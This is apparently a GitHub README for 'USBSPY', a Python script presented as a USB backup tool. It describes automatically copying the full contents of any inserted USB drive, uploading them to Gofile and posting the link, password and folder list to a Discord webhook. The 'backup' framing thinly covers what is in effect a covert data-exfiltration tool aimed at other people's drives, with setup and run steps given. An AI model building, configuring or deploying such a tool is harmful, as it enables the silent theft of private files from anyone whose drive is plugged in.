# **USBSPY - USB Backup and Upload Script** 💾

## **Description** 📜

This Python script automatically detects a USB flash drive once connected to your computer, creates an encrypted backup of the drive's contents, uploads it to Gofile, and sends the download link to a Discord channel via a webhook. It also includes information about the largest folders in the drive, making it easy to track and manage your files.

### **Key Features** 🎉
- **Auto-detects USB Drive**: Monitors for the connection of any USB flash drive and starts the backup process.
- **AES Encryption**: Creates a password-protected zip file using AES encryption.
- **File Upload**: Uploads the zip file to Gofile for easy online access.
- **Discord Notification**: Sends a detailed message to a Discord webhook with the download link, file size, and top 10 largest folders in the USB drive.
- **File Management**: The script provides insights into the largest folders within the drive, helping you manage your files more effectively.

---

## **How It Works** ⚙️

1. **USB Detection**: 
   The script waits for a USB drive to be connected.
   
2. **Zip Encryption**:
   Once the drive is detected, it zips up the contents of the drive into an AES-encrypted zip file with a password.

3. **File Upload**:
   After the zip file is created, it uploads the file to **Gofile.io** and retrieves the download and delete links.

4. **Discord Notification**:
   The script sends a detailed notification to your Discord channel, including:
   - Username of the person running the script
   - Date and time of the backup
   - Gofile download link
   - The password used for the zip file
   - A list of the 10 largest folders in the USB drive

---

## **Setup & Requirements** 🛠️

Before running the script, ensure you have the following libraries installed:

### **Dependencies**:
- `psutil` - For detecting removable drives.
- `pyzipper` - For creating encrypted zip files.
- `requests` - For uploading the file to Gofile and sending messages to Discord.
- `getpass` - To fetch the username.
- `tempfile` - For temporary file storage.
- `math` - For size calculations.

Install them using pip:

```bash
pip install psutil pyzipper requests
```

---

## **Usage** 🚀

1. Clone this repository to your local machine.

```bash
git clone https://github.com/DeWarexd/USBSPY.git
cd USBSPY
```

2. Edit the script:
   - Replace the **`DISCORD_WEBHOOK`** with your own Discord webhook URL.
   - Optionally, change the **`PASSWORD`** to your preferred zip file password.

3. Run the script:

```bash
python USBSPY.py
```

4. The script will automatically detect a connected USB drive, create an encrypted backup, upload it to Gofile, and send a Discord notification.

---

## **Discord Webhook Message** 📲

When the script completes, you’ll receive a detailed message in your Discord channel. Here's an example of what it looks like:

> **Example Discord Message**:
> 
>
> - **Username**: `user123`
> - **Date/Time**: `12.03.2025 14:45:30`
> - **Gofile Link**: [Download Link](https://gofile.io/d/abc123)
> - **Password**: `your_password`
> - **Top 10 Largest Folders**:
> 
> ```plaintext
> 📂 FolderA: 10 GB
> 📂 FolderB: 5 GB
> 📂 FolderC: 2 GB
> ... (and more)
> ```

This message will contain a clickable link to download the file and additional details for the backup process.

---

## **Customizing the Script** 🎨

You can customize various elements of the script to better suit your needs:

- **Max Zip Size**: The script limits the zip file size to a maximum (default: 1GB). You can change the value of `MAX_SIZE_MB` to adjust the file size.
- **Password Protection**: Change the password used for AES encryption by modifying the `PASSWORD` variable.
- **Discord Message Content**: Modify the format of the Discord message by adjusting the `send_discord_webhook` function.
- **Top Folder Count**: Change the number of top folders displayed by editing the `get_top_10_folders` function.

---

## **Sample Output** 🖼️

Once the process is completed successfully, the following message will be sent to your Discord webhook:

```
@everyone
🔐 Username: user123
📅 Date/Time: 12.03.2025 14:45:30
🔗 Gofile Upload Link: [Click here to Download](https://gofile.io/d/abc123)
🗂️ .zip Password: your_password
📦 .zip File Size: 500 MB
📂 Top 10 Largest Folders:
```
```
📁 FolderA: 10 GB
📁 FolderB: 5 GB
📁 FolderC: 2 GB
... (and more)
```

---

## **License** 📜

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---
